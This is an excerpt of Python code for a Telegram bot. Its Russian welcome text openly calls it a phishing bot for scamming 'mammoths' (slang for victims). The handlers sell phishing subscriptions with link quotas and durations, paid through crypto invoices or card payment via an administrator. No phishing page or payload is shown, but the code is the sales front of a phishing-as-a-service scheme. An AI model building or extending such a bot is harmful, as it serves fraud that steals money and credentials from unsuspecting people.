...
async def cmd_start(message: types.Message):
    welcome_text = """Фишинг Бот для скама мамонтов и жертв
...
async def show_subscriptions(callback_query: types.CallbackQuery):
    text = """Выберите подписку для фишинга
...
async def subscription_details(callback_query: types.CallbackQuery):
    ...
    if subscription_type in SUBSCRIPTION_PRICES:
        ...
        text = f"""{subscription_names[subscription_type]}

Цена: {price} ₽
Лимит ссылок: {limits['links']}
Срок действия: {limits['lifetime']} дней
...
async def buy_subscription_crypto(callback_query: types.CallbackQuery):
    ...
    if subscription_type in SUBSCRIPTION_PRICES:
        ...
        if pay_url and invoice_id:
            ...
            invoice_text = f"""Счет для оплаты создан

Сумма: {price} ₽
Подписка: {subscription_type.upper()}
Способ оплаты: CryptoBot
Действителен: 60 минут
...
async def buy_subscription_card(callback_query: types.CallbackQuery):
    ...
    if subscription_type in SUBSCRIPTION_PRICES:
        ...
        card_text = f"""Оплата картой (через администратора)
...
Для работы с фишинг ботом используйте кнопки:

Купить подписку - для доступа к функциям
Поддержка - для связи с техподдержкой

Или отправьте команду /start для начала работы"""
